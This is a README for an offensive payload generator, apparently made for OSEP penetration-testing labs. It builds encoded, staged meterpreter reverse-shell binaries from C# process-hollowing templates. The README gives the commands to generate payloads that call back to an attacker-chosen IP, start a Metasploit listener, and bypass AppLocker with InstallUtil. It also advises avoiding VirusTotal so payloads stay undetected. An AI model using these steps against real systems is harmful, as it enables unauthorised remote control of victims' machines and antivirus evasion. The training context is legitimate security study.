# laz-y
Automating payload generation for OSEP labs and exam. This tool generates x86 and x64 HTTPS staged meterpreter shellcodes, injects them in your CS templates, and generate C# binaries from Linux using mcs. It supports ROT encoding, and soon XOR encoding.

## But, why?
The VPN connection dropped during one of the OSEP challenge labs, and my local IP changed. I needed to recompile all the payloads and tools.. I did not, I wrote a script :) 

## How does it work?
This repo provides a process hollowing template as an example, the point of this tool is to use your own templates.  
When started, the python script will search for marks in all files you put in the "templates" folder and swap the marks for the MSF payload and decoding routines. It then exports the modified template files in the "output" folder, and run "mcs" C# compiler on all *.cs files.
You end up with :
* Your initial templates, untouched
* The templates with marks replaced with MSF payloads and decoding routines
* If the templates are .cs, the resulting C# binaries
* The according metasploit .rc files to start your listeners

## Installation
This script has only been tested on Kali. Execute the following commands on an updated Kali OS to set up the environment:
* `sudo apt update && sudo apt install mono-mcs -y`
* `git clone https://github.com/Nariod/laz-y.git`
* `cd laz-y`
* `pip3 install -r requirements.txt`

## Usage
* DO NOT UPLOAD ANYTHING TO VIRUSTOTAL, if you must use https://antiscan.me/
* Add your CS templates in the "templates" folder
* Add the mark `!!!_SHELLCODE_MARK!!!` in the templates, where you want the shellcode to be injected
* Add the mark `!!!DECODE_ROUTINE!!!` in the templates, where you want the decoding routine to be injected
* Run the script with `python3 laz-y.py -l CALLBACK_IP -p CALLBACK_PORT -e ENCODING_OPTION`
* Retrieve the metasploit ressource file (.rc) in the "output" folder
* Start your listener with `sudo msfconsole -q -r output/https.rc`
* Retrieve and use the final binaries located in the "output" folder

On target machine, the final binaries can be executed by:
* Directly executing the binaries, in the case Applocker is not enforced
* Using the InstallUtil lolbin by using `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Nariod\Desktop\MY_BINARY.exe` to circumvent Applocker

Generating binaries on Kali:

![Usage](/images/Usage.png)

Executing the binaries on Windows target, using the InstallUtil lolbin:

![Usage](/images/InstallUtil.png)

Enjoying some shell love:

![Usage](/images/GettingShells.png)

## Research and development
For research purposes, I dedicated [a repo](https://github.com/Nariod/Laz-y-templates) for C# templates compatible with lazy and more realist operations. 

## To do
- [x] Basic mark for shellcode swaping
- [x] Add ROT encoding support
- [x] Force arch when mcs compiles
- [x] Add msf resource files
- [ ] Add XOR support
- [X] Generate the msf resource files
- [x] Check user input for safety
- [x] InstallUtil lolbin support

## Credits
* Stackoverflow 
* https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86

Templates
* Process Hollowing : https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs

## Legal disclaimer
Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.